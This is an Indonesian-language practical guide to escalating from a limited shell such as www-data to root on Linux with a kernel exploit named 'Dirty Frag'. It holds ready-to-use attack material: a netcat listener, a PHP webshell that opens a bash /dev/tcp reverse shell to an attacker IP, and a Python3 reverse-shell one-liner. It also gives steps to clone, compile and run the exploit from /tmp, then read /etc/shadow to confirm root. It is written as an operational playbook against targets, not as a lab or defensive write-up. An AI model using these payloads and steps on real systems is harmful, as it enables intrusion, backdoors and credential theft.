
# Local Privilege Escalation (LPE) Guide: Dirty Frag

Panduan praktis untuk melakukan eskalasi hak akses dari user terbatas (seperti `www-data` atau user biasa) menjadi `root` menggunakan celah kernel **Dirty Frag**.

---

## 💡 Apa itu Dirty Frag & Kenapa Bisa Dieksploitasi?
**Dirty Frag** adalah celah keamanan *Local Privilege Escalation* (LPE) pada Linux Kernel yang mengeksploitasi kelemahan penanganan memori (*memory fragmentation* / manajemen heap kernel). 
* **Alasan Menggunakan Eksploit Ini:** Celah kernel tingkat rendah seperti ini sangat ampuh karena langsung memanipulasi struktur memori sistem operasi (*kernel space*), melewati batasan izin keamanan standar (*user space*), sehingga dapat mengubah akses pengguna biasa menjadi `root` secara instan tanpa memerlukan kredensial tambahan.

---

## 1. Validasi Awal (Prerequisite Checks)

Sebelum menjalankan eksploitasi, sangat penting untuk memvalidasi lingkungan target agar proses tidak gagal atau membuat sistem target *crash*.

### A. Cek Identitas User Saat Ini
Pastikan Anda sudah memiliki akses *shell* dasar dan ketahui siapa user Anda:

    id
    whoami

### B. Cek Versi Kernel Target (Wajib Rentan!)
Cek apakah versi kernel sistem target masuk dalam rentang yang rentan terhadap eksploitasi Dirty Frag:

    uname -r

> ⚠️ **Catatan Penting Versi Kernel (Rentan):**
> Eksploitasi ini umumnya efektif pada **Linux Kernel versi 5.8 hingga versi 5.15.x** (sebelum dilakukan *patching* oleh vendor atau pembaruan kernel mayor). Jika versi kernel target berada di luar rentang tersebut atau sudah ditambal, eksploitasi kemungkinan besar akan gagal atau menyebabkan sistem *kernel panic*.

### C. Cek Ketersediaan Alat Kompilasi (`gcc` & `git`)
Pastikan compiler `gcc` dan utilitas `git` tersedia di mesin target untuk mengunduh serta mengompilasi file *exploit*:

    which gcc git

> *Catatan:* Jika `gcc` tidak tersedia di target, Anda harus mengompilasi filenya di komputer lokal Anda terlebih dahulu, lalu mengunggah file binari jadinya ke target.

---

## 2. Menyiapkan Listener di Komputer Penyerang

Sebelum memicu *reverse shell* dari target, aktifkan *listener* Netcat di mesin lokal Anda (Attacker):

    nc -lvp 4444

---

---

## 3. Unggah Payload / Akses Awal (Upload Backdoor)

Anda bisa mendapatkan akses awal menggunakan salah satu dari metode berikut (sesuaikan dengan kondisi target):

### Opsi A: Melalui File Upload PHP (Webshell)
Jika target memiliki celah *File Upload* pada aplikasi web, buat file bernama `shell.php` dengan isi kode berikut:

    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_PENYERANG/4444 0>&1'"); ?>

* **Cara Eksekusi:** Unggah file tersebut melalui fitur *upload* di aplikasi web target, lalu panggil/akses file tersebut melalui browser atau menggunakan `curl`:
  
      curl http://IP_TARGET/path/to/uploads/shell.php

### Opsi B: Melalui Python3 Reverse Shell (Paling Handal)
Jika Anda memiliki celah *Command Injection* langsung dan metode Bash TCP gagal (karena `/dev/tcp` diblokir), gunakan payload **Python3** karena jauh lebih stabil dan jarang gagal di server modern:

    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_PENYERANG",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

*Jangan lupa ganti `IP_PENYERANG` dan sesuaikan port listener Netcat Anda di komputer lokal.*

---

## 4. Pindah ke Direktori Kerja Sementara (`/tmp`)

Setelah berhasil terhubung dan mendapatkan *shell* (misalnya sebagai `www-data`), segera pindah ke direktori penyimpanan sementara:

    cd /tmp

> 🔍 **Kenapa Harus di `/tmp` (Bukan di Tempat Lain)?**
> 1. **Izin Tulis (World-Writable):** Direktori `/tmp` dan `/dev/shm` umumnya diatur agar dapat dibaca dan ditulisi oleh siapa saja (termasuk user dengan hak akses paling rendah seperti `www-data`).
> 2. **Izin Eksekusi (Executable):** Berbeda dengan direktori web (seperti `/var/www/html`) yang sering kali menerapkan proteksi keamanan ketat di mana file biner dilarang dieksekusi (`noexec`), direktori `/tmp` umumnya memperbolehkan kompilasi dan eksekusi file biner secara bebas.

---

## 5. Kloning, Kompilasi, dan Eksekusi Exploit

Di dalam folder `/tmp`, jalankan tahapan eksploitasi kernel berikut:

### A. Kloning Repositori Exploit
    git clone https://github.com/V4bel/dirtyfrag.git
    cd dirtyfrag

### B. Kompilasi File C
    gcc -O0 -Wall -o exp exp.c -lutil

### C. Jalankan Program Exploit
    ./exp

---

## 6. Verifikasi Hak Akses Root & Kelayakan Sistem

Setelah program *exploit* dieksekusi, periksa kembali status hak akses Anda secara menyeluruh untuk memastikan proses eskalasi benar-benar sukses dan stabil:

    id
    whoami

> ✅ **Indikator Keberhasilan:**
> * Perintah `id` menampilkan `uid=0(root) gid=0(root)`.
> * Jika ingin memastikan lebih jauh, Anda bisa mencoba membaca file privat yang hanya bisa diakses oleh *root*, contohnya:
>   ```bash
>   head -n 1 /etc/shadow
>   ```
> * Jika isi file `shadow` berhasil ditampilkan tanpa pesan *Permission Denied*, maka hak akses `root` sudah berada di tangan Anda!
